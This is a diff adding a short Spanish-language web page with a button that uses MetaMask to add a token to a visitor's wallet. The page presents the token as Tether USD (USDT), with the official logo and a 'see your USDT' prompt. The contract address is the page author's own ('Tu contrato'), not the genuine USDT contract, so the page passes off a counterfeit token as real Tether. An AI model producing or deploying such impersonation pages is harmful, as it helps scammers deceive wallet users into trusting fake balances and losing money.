@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Agregar USDT</title>
+  <script src="https://cdn.jsdelivr.net/npm/@metamask/detect-provider"></script>
+</head>
+<body>
+  <h1>Agregar Tether USD (USDT)</h1>
+  <p>Para ver tu USDT, haz clic en el botón.</p>
+  <button onclick="addToken()">Agregar USDT</button>
+
+  <script>
+    async function addToken() {
+      if (window.ethereum) {
+        try {
+          await window.ethereum.request({
+            method: 'wallet_watchAsset',
+            params: {
+              type: 'ERC20',
+              options: {
+                address: '0x2aE...40E82', // Tu contrato
+                symbol: 'USDT',
+                decimals: 6,
+                image: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png',
+              },
+            },
+          });
+          alert('USDT agregado con éxito!');
+        } catch (error) {
+          console.error('Error:', error);
+          alert('Hubo un error. Revisá la consola.');
+        }
+      } else {
+        alert('MetaMask no está instalado.');
+      }
+    }
+  </script>
+</body>
+</html>
